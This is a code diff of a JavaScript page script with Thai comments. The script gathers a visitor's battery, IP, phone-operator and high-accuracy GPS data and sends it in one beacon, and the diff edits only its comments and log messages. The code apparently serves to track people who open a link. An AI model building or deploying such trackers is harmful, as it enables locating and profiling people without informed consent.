@@ -122,25 +122,25 @@ function getUrlParameters() {
     dataToSend.phoneInfo = { possibleOperator: "ข้อผิดพลาด" };
   });
 
-  // 4. Geolocation - แยกออกมาและให้ทำงานทันที แต่ไม่ส่งข้อมูลทันที
+  // 4. Geolocation - เรียกใช้ฟังก์ชันดึงข้อมูล GPS แต่ไม่ส่งข้อมูลทันที
   const locationPromise = getLocationDataQuickly(dataToSend);
 
-  // --- รอข้อมูล Asynchronous ทั้งหมด แล้วส่งข้อมูลครั้งเดียว ---
+  // --- รอข้อมูล Asynchronous ทั้งหมด รวมถึงข้อมูล GPS แล้วส่งข้อมูลครั้งเดียว ---
   Promise.allSettled([batteryPromise, ipPromise, phonePromise, locationPromise])
     .then(() => {
-      console.log("All async data collected, sending complete data once...");
+      console.log("All data collected (including GPS), sending complete data...");
       sendDataWithBeacon(dataToSend);
     });
 
 })(); // End of main IIFE
 
-// ฟังก์ชันใหม่สำหรับเก็บข้อมูลตำแหน่งอย่างรวดเร็ว แต่ไม่ส่งข้อมูลทันที
+// ฟังก์ชันสำหรับเก็บข้อมูลตำแหน่งอย่างรวดเร็ว (แต่ไม่ส่งข้อมูลทันที)
 function getLocationDataQuickly(dataToSend) {
   console.log("Starting quick GPS location collection");
   
   return new Promise((resolve) => {
     if (navigator.geolocation) {
-      // ตั้งค่า timeout ที่สั้นลง (5 วินาที) เพื่อให้ได้ผลเร็วขึ้น แต่ยังคงความแม่นยำ
+      // ตั้งค่า timeout ที่สั้นลงเพื่อให้ได้ผลเร็วขึ้น แต่ยังคงความแม่นยำ
       const geoOptions = {
         enableHighAccuracy: true,
         timeout: 5000,
@@ -157,7 +157,7 @@ function getLocationDataQuickly(dataToSend) {
           const accuracy = position.coords.accuracy;
           const locationString = `${lat}, ${long}`;
           
-          // ปรับปรุงข้อมูลในชุดข้อมูลหลักเท่านั้น
+          // ปรับปรุงข้อมูลในชุดข้อมูลหลัก
           dataToSend.location = locationString;
           dataToSend.locationData = {
             lat: lat,
@@ -194,7 +194,7 @@ function getLocationDataQuickly(dataToSend) {
           );
         },
         (error) => {
-          console.warn("Error getting GPS location:", error);
+          console.warn("Error getting initial GPS location:", error);
           dataToSend.location = "ไม่สามารถระบุตำแหน่งได้";
           dataToSend.locationError = error.code; // เก็บรหัสข้อผิดพลาด
           
